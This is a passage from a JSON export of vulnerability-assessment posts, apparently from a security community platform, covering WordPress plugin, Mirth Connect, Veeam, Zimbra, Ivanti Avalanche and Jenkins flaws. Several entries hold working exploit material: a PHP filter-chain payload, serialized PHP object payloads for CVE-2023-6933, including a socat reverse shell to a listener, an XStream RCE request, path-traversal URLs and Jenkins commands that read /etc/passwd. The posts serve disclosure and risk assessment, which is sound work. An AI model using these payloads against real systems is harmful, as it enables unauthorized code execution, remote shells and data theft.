.ISO_6937-2|convert.iconv.UTF16.GB13000|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.DEC.UTF-16|convert.iconv.ISO8859-9.ISO_6937-2|convert.iconv.UTF16.GB13000|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.BIG5.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UNICODE|convert.iconv.ISIRI3342.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UTF-16|convert.iconv.ISO6937.UTF16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1162.UTF32|convert.iconv.L4.T.61|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.ISO-8859-14.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.BIG5HKSCS.UTF16|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UTF-16|convert.iconv.ISO6937.UTF16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO88594.UTF16|convert.iconv.IBM5347.UCS4|convert.iconv.UTF32BE.MS936|convert.iconv.OSF00010004.T.61|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.BIG5HKSCS.UTF16|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 0\r\n```\r\n\r\n\r\n\r\n# References\r\nhttps://www.wordfence.com/blog/2023/12/critical-unauthenticated-remote-code-execution-found-in-backup-migration-plugin/\r\nhttps://www.synacktiv.com/en/publications/php-filters-chain-what-is-it-and-how-to-use-it\r\nhttps://wordpress.org/plugins/backup-backup/\r\n",
      "score": 2,
      "metadata": {
        "attacker-value": 4,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "6baa7b56-79b5-4fcb-8bc9-2970ac0a0d25",
      "editorId": "9c3c0bdd-7a98-48de-a889-f351a2aec7cf",
      "topicId": "df6ce950-2612-479d-97d6-be5cd64a01cf",
      "created": "2024-01-27T19:41:00.911476Z",
      "revisionDate": "2024-01-27T19:41:00.911289Z",
      "document": "Knocking down attacker value a bit because there [appear to be](https://twitter.com/Shadowserver/status/1749803281898262597) only a few hundred of these exposed and vulnerable, and perhaps surprisingly, it's been a few months since full details were released and there's still no known exploitation. Unclear how common the engine is in real-world environments from talking to offensive security folks focused on healthcare. I think it's fair to balance rightful sensitivity about anything that could compromise healthcare systems with some skepticism about the particular target in this case. If we see IRL exploitation, I'm happy to eat those words :) ",
      "score": 1,
      "metadata": {
        "attacker-value": 3
      },
      "tags": []
    },
    {
      "id": "211c013a-d82b-479a-9997-d447a3bb33fc",
      "editorId": "9c3c0bdd-7a98-48de-a889-f351a2aec7cf",
      "topicId": "33a9d13f-ca57-4d20-a996-0720a40eea42",
      "created": "2024-01-27T20:16:57.781888Z",
      "revisionDate": "2024-01-29T09:01:37.333927Z",
      "document": "We've continued to see [reports](https://twitter.com/malmoeb/status/1744145322748567860) of exploitation for CVE-2023-27532. Almost a year out from the initial advisory, there's been ransomware ([Cuba](https://www.bleepingcomputer.com/news/security/cuba-ransomware-uses-veeam-exploit-against-critical-us-organizations/), [Akira](https://news.sophos.com/en-us/2023/12/21/akira-again-the-ransomware-that-keeps-on-taking/)) and other use of this vuln [by financially motivated groups](https://labs.withsecure.com/publications/fin7-target-veeam-servers). Patch uptake has [reportedly](https://twitter.com/leak_ix/status/1695869167482683426) been pretty strong, but notably, this is a solid internal attack vector, so locking down internet exposure alone isn't a sufficient mitigation plan.",
      "score": 2,
      "metadata": {
        "attacker-value": 4,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "19076e68-1c52-48c1-bc15-7f6a3053c357",
          "name": "CISA KEV Listed",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "cisa_kev_listed"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "def6357c-0771-400a-909d-2021d9f6b227",
          "name": "Observed in ransomware attacks",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "observed_in_ransomware"
        }
      ]
    },
    {
      "id": "2c2c49bb-bf2d-493d-8073-3fc921a59355",
      "editorId": "9c3c0bdd-7a98-48de-a889-f351a2aec7cf",
      "topicId": "abf61370-26ec-4f79-83d4-32a68b43bd5e",
      "created": "2024-01-28T19:36:26.887753Z",
      "revisionDate": "2024-01-28T19:36:26.887167Z",
      "document": "Per Google's Threat Analysis Group (TAG), this bug was [exploited as a zero-day](https://blog.google/threat-analysis-group/zimbra-0-day-used-to-target-international-government-organizations/) and has been used by at least four different threat actors to \"steal email data, user credentials, and authentication tokens.\" Threat campaigns have targeted Greece, Moldova, Tunisia, Vietnam, and Pakistan. ",
      "score": 1,
      "metadata": {
        "attacker-value": 5
      },
      "tags": [
        {
          "id": "19076e68-1c52-48c1-bc15-7f6a3053c357",
          "name": "CISA KEV Listed",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "cisa_kev_listed"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        }
      ]
    },
    {
      "id": "5e518dea-96f8-4d0d-a078-9c273b249a24",
      "editorId": "5712f2dd-0bcc-4f5b-8266-5559063d40d0",
      "topicId": "bd78b55a-91ee-42fa-933c-7b1d9b05e8c8",
      "created": "2024-01-29T00:28:46.779684Z",
      "revisionDate": "2024-01-29T01:51:23.755874Z",
      "document": "# Introduction to CVE-2023-6933 Vulnerability\r\n\r\n\r\n---\r\n\r\n## Description\r\nThe \"Better Search Replace\" plugin for WordPress exhibits a critical vulnerability known as PHP Object Injection. This security flaw is present in all versions up to and including 1.4.4. It arises from the deserialization of untrusted input, enabling unauthenticated attackers to inject a PHP Object into the system. Notably, the plugin itself does not contain a PHP Object Injection (POI) chain. However, if an additional vulnerable plugin or theme is installed on the target system that does include a POI chain, this vulnerability could potentially allow attackers to delete arbitrary files, access sensitive data, or execute malicious code.\r\n\r\n\r\n---\r\n\r\n## Additional Analysis\r\nIn this analysis, we will also cover the vulnerability in WordPress version 6.4.0, which was addressed to fix a Remote Code Execution (RCE) issue. Moreover, we will explore the possibility of chaining these two vulnerabilities to achieve unauthenticated remote code execution.\r\n\r\n\r\n---\r\n\r\n## Discovering the Version of Better Search Replace Plugin\r\n\r\nTo find out the current stable version of the Better Search Replace plugin, use the following command:\r\n\r\n```bash\r\necho 'http://wp6.4-better-search-replace-before-1.4.5.local' \\\r\n| sed \"s'$'/wp-content/plugins/better-search-replace/README.txt'\" \\\r\n| httpx -silent -mc 200 -er 'Stable tag:.*'\r\nhttp://wp6.4-better-search-replace-before-1.4.5.local/wp-content/plugins/better-search-replace/README.txt [Stable tag: 1.4.3]\r\n```\r\n\r\n# Setup and Initial Steps for Vulnerability Analysis\r\n\r\n\r\n---\r\n\r\n## Docker Installation\r\nFirstly, I set up three Docker containers for the analysis:\r\n1. **MySQL**: To provide database support.\r\n2. **WordPress 6.4.0**: Integrated with the \"Better Search Replace\" plugin version 1.4.3.\r\n3. **Linux Environment**: To serve as the recipient for the Remote Code Execution (RCE).\r\n\r\n\r\n---\r\n\r\n## Analyzing GitHub Commits\r\nTo gain a deeper understanding of the vulnerability, I began analyzing specific commits in the GitHub repository of the \"Better Search Replace\" plugin. These commits potentially contain crucial information regarding the nature and fixes of the vulnerability.\r\n\r\n- **Commit 1**: [Delicious Brains - Commit c8d1694](https://github.com/deliciousbrains/better-search-replace/commit/c8d1694fe24d52156800197797f704a741e1050d)\r\n\r\n![img_0.png](https://github.com/w2xim3/CVE-2023-6933/raw/main/img_0.png)\r\n\r\n- **Explanation of Function Parameters**\r\n\r\nIn this function, we can observe the following parameters:\r\n\r\n- `from`: This is the text to be replaced.\r\n- `to`: This represents the replacement text.\r\n- `data`: This is the data that needs to be replaced.\r\n\r\nIt is important to note here that the data is passed directly to the function `$this->unserialize($data).`\r\n\r\n![img_1.png](https://github.com/w2xim3/CVE-2023-6933/raw/main/img_1.png)\r\n\r\nTherefore, here we can see that the string will be deserialized.\r\n\r\n# Visual Plugin Analysis\r\n\r\nIn order to determine where it is feasible to inject a serialized object into `data`, we will explore the visual interface of the plugin.\r\n\r\n![img_2.png](https://github.com/w2xim3/CVE-2023-6933/raw/main/img_2.png)\r\n\r\nWe can therefore place a serialized object in one of these tables, but we need a vulnerable serialized object to be able to achieve Remote Code Execution (RCE).\r\n\r\n---\r\n# Exploiting PHP Object in WordPress 6.4.0\r\n\r\nIn WordPress version 6.4.0, a PHP object, `WP_HTML_Token`, was introduced. Here's a breakdown of its structure and potential for exploitation:\r\n\r\n\r\n## PHP Class: WP_HTML_Token\r\nmain.php\r\n```php\r\n\r\n<?php\r\nclass WP_HTML_Token {\r\n    public $bookmark_name = null;\r\n    public $node_name = null;\r\n    public $has_self_closing_flag = false;\r\n    public $on_destroy = null;\r\n\r\n    /**\r\n     * Constructor - creates a reference to a token in some external HTML string.\r\n     *\r\n     * @since 6.4.0\r\n     *\r\n     * @param string   $bookmark_name         Name of bookmark corresponding to location in HTML where token is found.\r\n     * @param string   $node_name             Name of node token represents; if uppercase, an HTML element; if lowercase, a special value like \"marker\".\r\n     * @param bool     $has_self_closing_flag Whether the source token contains the self-closing flag, regardless of whether it's valid.\r\n     * @param callable $on_destroy            Function to call when destroying token, useful for releasing the bookmark.\r\n     */\r\n     \r\n    public function __construct( $bookmark_name, $node_name, $has_self_closing_flag, $on_destroy = null ) {\r\n        $this->bookmark_name         = $bookmark_name;\r\n        $this->node_name             = $node_name;\r\n        $this->has_self_closing_flag = $has_self_closing_flag;\r\n        $this->on_destroy            = $on_destroy;\r\n    }\r\n    public function __destruct() {\r\n        if ( is_callable( $this->on_destroy ) ) {\r\n           call_user_func( $this->on_destroy, $this->bookmark_name );\r\n        }\r\n    }\r\n}\r\n```\r\n\r\n# Exploitation Strategy\r\nThe call_user_func function within the __destruct method is key for exploitation. It requires:\r\n\r\n`$this->on_destroy`: A callable function.\r\n\r\n`$this->bookmark_name`: An argument for the callable function.\r\n\r\n# Exploitation Code\r\nTo exploit this, I tried the following add lines here to the end of main.php (note: comment out the call_user_func line before serialization):\r\n\r\n```bash\r\n$token = new WP_HTML_Token(\"touch /tmp/rce\", \"nodeName\", false, 'system');\r\n$serializedObject = serialize($token);\r\necho $serializedObject;\r\n```\r\n\r\n```bash\r\nphp main.php\r\nO:13:\"WP_HTML_Token\":4:{s:13:\"bookmark_name\";s:14:\"touch /tmp/rce\";s:9:\"node_name\";s:8:\"nodeName\";s:21:\"has_self_closing_flag\";b:0;s:10:\"on_destroy\";s:6:\"system\";}\r\n```\r\n# Testing the Exploitation Theory\r\n\r\nNow, it's feasible to test the theory by adding an unauthenticated comment on the website.\r\n\r\n![img_3.png](https://github.com/w2xim3/CVE-2023-6933/raw/main/img_3.png)\r\n# Triggering the Deserialization Function\r\n\r\nIt's time to utilize the plugin to trigger the deserialization function.\r\n\r\n\r\n![img_4.png](https://github.com/w2xim3/CVE-2023-6933/raw/main/img_4.png)\r\n\r\n# RCE\r\nThe file was created as expected, so the RCE during deserialization and during the destruction of the object works correctly.\r\n\r\n![img_5.png](https://github.com/w2xim3/CVE-2023-6933/raw/main/img_5.png)\r\n\r\n# Observations on the Exploitation Process\r\n\r\n\r\n---\r\n\r\n## Dangerous Aspects\r\n\r\n1. **Persistence of Deleted Comments**: Even if a comment is deleted, it remains in the database tagged as 'not shown to user'. However, the plugin does not distinguish between visible and invisible comments and proceeds to deserialize the object regardless.\r\n\r\n2. **Deserialization During Dry Run**: The deserialization process occurs even during a dry run, which is a significant oversight in terms of security.\r\n\r\n\r\n---\r\n\r\n## Misclassification of CVSS by Wordfence\r\n\r\n- **Initial Assessment**: The categorization by Wordfence of the Common Vulnerability Scoring System (CVSS) seems to be erroneous. In my opinion, it should be rated at 8.8.\r\n  \r\n- **Revised Assessment**: The current CVSS score is 9.8. However, this rating overlooks the fact that \"user interaction is required on the correct table\" for the code deserialization to occur. To confirm this, I contacted researcher Sam Pizzey, who affirmed my observation: the execution of the vulnerability requires someone to interact with the plugin.\r\n\r\n# Reverse Shell Exploitation\r\n\r\nFor those interested in reverse shell techniques, I have adapted my payload to streamline this process. This could be applied to websites where registration is open to everyone:\r\n\r\n---\r\n\r\n## Modified Payload\r\n```bash\r\n$token = new WP_HTML_Token(\"socat TCP:172.17.0.4:4444 EXEC:/bin/bash\", \"nodeName\", false, 'system');\r\n$serializedObject = serialize($token);\r\necho $serializedObject;\r\nO:13:\"WP_HTML_Token\":4:{s:13:\"bookmark_name\";s:40:\"socat TCP:172.17.0.4:4444 EXEC:/bin/bash\";s:9:\"node_name\";s:8:\"nodeName\";s:21:\"has_self_closing_flag\";b:0;s:10:\"on_destroy\";s:6:\"system\";}\r\n```\r\nInserting PHP Object into Profile\r\n\r\n---\r\n\r\n## Next, I edited my profile with the PHP object.\r\n\r\n![img_6.png](https://github.com/w2xim3/CVE-2023-6933/raw/main/img_6.png)\r\n\r\n\r\n---\r\n\r\n## Opening a Listener\r\nI then opened a listener to await the incoming connection.\r\n\r\n![img_7.png](https://github.com/w2xim3/CVE-2023-6933/raw/main/img_7.png)\r\n\r\n\r\n---\r\n\r\n## Triggering the Plugin\r\n![img_8.png](https://github.com/w2xim3/CVE-2023-6933/raw/main/img_8.png)\r\n\r\n\r\n---\r\n\r\n## Receiving the Reverse Shell\r\nFinally, I successfully received the reverse shell connection.\r\n\r\n![img_9.png](https://github.com/w2xim3/CVE-2023-6933/raw/main/img_9.png)\r\n\r\n---\r\n## Remediation Section\r\n\r\n### Update better-search-replace \r\nTo address the vulnerability, update to a version higher than Better Search Replace 1.4.4 and Make your WordPress updates.\r\n\r\n## Conclusion\r\nThis document provides a detailed overview of the CVE-2023-6933 vulnerability, including its impact, technical details, and mitigation strategies. Understanding and addressing this vulnerability is crucial for maintaining the security and integrity of WordPress installations using the 'Better Search Replace' plugin.\r\n\r\n### Author Information\r\n\r\n---\r\n\r\nAuthor: Maxime Paill\u00e9\r\n\r\nGitHub: [w2xim3](https://github.com/w2xim3)\r\n\r\nLinkedIn: [LinkedIn Profile](https://www.linkedin.com/in/maxime-paill%C3%A9-9125b4150/)\r\n",
      "score": 1,
      "metadata": {
        "mitre-tactics": "Execution",
        "attacker-value": 3,
        "exploitability": 3
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "01c67142-c23f-4ee7-8803-49d10d588299",
          "name": "Requires user interaction",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "requires_interaction"
        }
      ]
    },
    {
      "id": "fd2fd562-df20-440b-8577-c9195a9d31a7",
      "editorId": "1754d880-537c-48c4-8738-5ad2ccde5258",
      "topicId": "2fd06fda-e52b-46f3-acb7-94f482b4bf3b",
      "created": "2024-01-29T17:43:51.057129Z",
      "revisionDate": "2024-01-29T21:37:19.806155Z",
      "document": "Mirth Connect is vulnerable to unauthenticated RCE due to the mishandling of data that is unmarshalled by the XStream library. This vulnerability was originally reported by [IHTeam](https://www.ihteam.net/advisory/mirth-connect/) in August 2023. Their report intentionally lacked any details as to the nature of the vulnerability in hopes of preventing its use in ransomware attacks.\r\n\r\nThis particular vulnerability affects versions <= 4.3.0 of Mirth Connect. A remote attacker can identify the target version using the REST API:\r\n\r\n```\r\ncurl --location 'https://192.168.159.128:8443/api/server/version' \\\r\n--header 'X-Requested-With: OpenAPI'\r\n```\r\n\r\nHorizon3.ai researchers later [determined](https://www.horizon3.ai/writeup-for-cve-2023-43208-nextgen-mirth-connect-pre-auth-rce/) that the patch for CVE-2023-37679 was incomplete. The Mirth Connect team addressed the issue by implementing a Deny List for the gadget chains published for XStream exploitation. In their writeup, Naveen Sunkavally noted that a common XStream payload was capable of exploiting the CVE-2023-37679 on certain versions of Java. Due to changes in more recent versions of Java however, the payload was not universal. Their writeup discloses a universal payload for exploiting CVE-2023-37679 as well as a payload that bypassed the denylist leading to CVE-2023-43208.\r\n\r\n```\r\ncurl --location 'https://192.168.159.128:8443/api/users/' \\\r\n--header 'X-Requested-With: OpenAPI' \\\r\n--header 'Content-Type: application/xml' \\\r\n--header 'Cookie: JSESSIONID=node01d59tmo5726v0tnjjk6jot7161.node0' \\\r\n--data '<sorted-set>\r\n    <string>foo</string>\r\n    <dynamic-proxy>\r\n        <interface>java.lang.Comparable</interface>\r\n        <handler class=\"org.apache.commons.lang3.event.EventUtils$EventBindingInvocationHandler\">\r\n        <target class=\"java.lang.ProcessBuilder\">\r\n            <command>\r\n            <string>sh</string>\r\n            <string>-c</string>\r\n            <string>touch /tmp/success</string>\r\n            </command>\r\n        </target>\r\n        <methodName>start</methodName>\r\n        <eventTypes/>\r\n        </handler>\r\n    </dynamic-proxy>\r\n</sorted-set>\r\n```\r\n*CVE-2023-37679 exploit using the XStream payload disclosed by Horizon3.ai*\r\n\r\nExploitation of this vulnerability yields code execution in the context of the service account. When run in docker, this is a non-root account; however, when installed on Windows, this is NT AUTHORITY\\SYSTEM.\r\n\r\nTo remediate this vulnerability, users should upgrade to version 4.4.0. Users should be aware, though, that 4.4.0 is vulnerable to CVE-2023-43208 and instead upgrade to 4.4.1 in which there are no publicly disclosed bypasses for this particular vector.",
      "score": 3,
      "metadata": {
        "attacker-value": 3,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "9951767f-04e7-43a7-b30b-20d2296cf622",
      "editorId": "9c3c0bdd-7a98-48de-a889-f351a2aec7cf",
      "topicId": "a38eb2be-793e-4345-8872-08ae9af24b3e",
      "created": "2024-01-29T21:16:16.311946Z",
      "revisionDate": "2024-01-29T21:16:16.311088Z",
      "document": "Rapid7 saw exploitation of this in customer environments in early December 2023. It's also been [used by the Cactus ransomware group](https://arcticwolf.com/resources/blog/qlik-sense-exploited-in-cactus-ransomware-campaign/). ",
      "score": 1,
      "metadata": {
        "attacker-value": 4
      },
      "tags": [
        {
          "id": "19076e68-1c52-48c1-bc15-7f6a3053c357",
          "name": "CISA KEV Listed",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "cisa_kev_listed"
        },
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "def6357c-0771-400a-909d-2021d9f6b227",
          "name": "Observed in ransomware attacks",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "observed_in_ransomware"
        }
      ]
    },
    {
      "id": "cd0c0c3b-47ab-419a-a3a8-0297705b8560",
      "editorId": "b68e9cb9-1bd0-4339-abe7-329618ce2467",
      "topicId": "4870afa8-a53b-4877-b02e-706956611959",
      "created": "2024-01-30T15:17:54.281175Z",
      "revisionDate": "2024-01-31T22:22:09.915532Z",
      "document": "This is a path traversal vulnerability in Ivanti Avalanche version 6.3.4.153. It is not clear if prior versions are also vulnerable. An unauthenticated attacker can leverage it to access any files under `C:\\PROGRAM DATA\\Wavelink\\AVALANCHE\\Web webapps\\AvalancheWeb\\` directory, by requesting the following URL:\r\n```\r\nhttp(s)://<domain>/AvalancheWeb//faces/javax.faces.resource/<file>?loc=<directory>\r\n```\r\nFor example, to access the `web.xml` configuration file, this request can be sent:\r\n```\r\nhttp(s)://<domain>/AvalancheWeb//faces/javax.faces.resource/web.xml?loc=../WEB-INF\r\n```\r\n\r\nHowever, the file extensions allowed to be accessed this way are quite limited. The [advisory](https://github.com/JBalanza/CVE-2023-41474) says only `.xml`, `.html` and potentially a few others, depending on the `.htaccess` rules. That being said, this is still an information disclosure issue that could reveal internal settings and be used by other potential attacks (e.g. the deployment descriptor file `web.xml`).\r\n\r\nThe advisory also describes a scenario where one could use a debug feature that performs a memory dump of the Avalanche process for debugging purposes. The memory dump file is stored under a path accessible by this path traversal and could reveal sensitive information the process had in memory when the dump was requested, such as credentials of users that had logged into the application. Note that this feature is only available to users with administrative privileges, which means the attacker needs to be authenticated with these privileges or an administrator has already performed a memory dump and left the file around.\r\n\r\nSo, it is important to patch this as soon as possible, but I don't think this is critical.\r\n",
      "score": 3,
      "metadata": {
        "mitre-tactics": "Discovery",
        "attacker-value": 2,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "cc249289-d74e-4045-8846-e7e31a173e95",
          "name": "No useful access",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "no_useful_data"
        }
      ]
    },
    {
      "id": "6381d058-7c24-4c5a-83f5-29083dfbfd62",
      "editorId": "d603b493-1c7b-4ee8-972f-185269cce6d3",
      "topicId": "9ee4db13-86e1-4f5a-af31-2e4fb4954620",
      "created": "2024-01-30T17:37:12.966745Z",
      "revisionDate": "2024-01-30T17:58:18.702621Z",
      "document": "Looking into this vulnerability, there are a number of factors to consider when gauging exploitability. [Horizion3ai](https://www.horizon3.ai/cve-2024-23897-assessing-the-impact-of-the-jenkins-arbitrary-file-leak-vulnerability/) have a good blog post going into detail on this, and the original [vendor advisory](https://www.jenkins.io/security/advisory/2024-01-24/) also goes into detail on the constraints of successful exploitation.\r\n\r\nWhile the vulnerability does allow for arbitrary file reading, there are several constraints that may make an attackers ability to read arbitrary files less likely to succeed. The main factors are the privileges the attacker has on the target Jenkins system (if any), the target platform that Jenkins is running on, and the type of file the attacker wants to read. Finally, based on what the attacker can successfully read, the attacker must then leverage this somehow, e.g. if they read an encrypted password, are they able to crack it? If they read a secret key from a text file, do they also need to successfully read encrypted binary files?\r\n\r\nAt a minimum, an unauthenticated attacker can read up to 3 lines of an arbitrary text file, for example the following 3 CLI requests will return the first, second and third line of the text file `/etc/passwd` (Jenkins is running in a docker container for this example). The CLI command `who-am-i`, `enable-job`, and `keep-build` are used to read the first, second and third line numbers respectively - although other commands such as `help` will return the first and second line of a file.\r\n\r\n```\r\n$ java -jar jenkins-cli.jar -s http://192.168.86.70:8080 who-am-i @/etc/passwd\r\n\r\nERROR: No argument is allowed: root:x:0:0:root:/root:/bin/bash\r\njava -jar jenkins-cli.jar who-am-i\r\nReports your credential and permissions.\r\n```\r\n\r\n```\r\n$ java -jar jenkins-cli.jar -s http://192.168.86.70:8080 enable-job @/etc/passwd\r\n\r\nERROR: Too many arguments: daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\r\njava -jar jenkins-cli.jar enable-job NAME\r\nEnables a job.\r\n NAME : Job name\r\n```\r\n\r\n```\r\n$ java -jar jenkins-cli.jar -s http://192.168.86.70:8080 keep-build @/etc/passwd\r\n\r\nERROR: Too many arguments: bin:x:2:2:bin:/bin:/usr/sbin/nologin\r\njava -jar jenkins-cli.jar keep-build NAME BUILD#\r\nMark the build to keep the build forever.\r\n NAME   : Item name\r\n BUILD# : Build number\r\n```\r\n\r\nThe first 3 lines of the file can then be reconstituted as follows: 